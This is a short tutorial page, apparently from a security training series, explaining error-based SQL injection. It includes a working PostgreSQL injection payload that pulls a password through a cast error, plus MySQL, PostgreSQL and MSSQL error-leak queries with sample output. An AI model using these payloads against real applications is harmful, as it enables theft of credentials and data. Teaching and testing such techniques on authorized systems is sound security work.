# Error-Based Blind SQL Injection

Error-based SQL injection extracts data by causing the database to produce error messages that contain sensitive information.

## Concept

Instead of seeing data directly, you trigger errors that reveal the data in the error message itself.

## Example

**PostgreSQL:**
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Error Message:**
```
ERROR: invalid input syntax for integer: "admin_password_123"
```

The password is revealed in the error!

## Database-Specific Techniques

See the [Database-Specific Syntax Cheat Sheet](../05-cheat-sheets/database-specific-syntax.md) for complete error-based techniques for MySQL, PostgreSQL, MSSQL, and Oracle.

## Key Techniques

### MySQL
```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
-- Error: XPATH syntax error: '\secret'
```

### PostgreSQL  
```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
-- Error: invalid input syntax for integer: "secret"
```

### MSSQL
```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- Error: Conversion failed when converting the varchar value 'secret' to data type int.
```

---

**Next:** [Time-Based Blind SQLi](time-based.md) | [Out-of-Band Techniques](oast-techniques.md)

**Remember: Only test on authorized systems!**
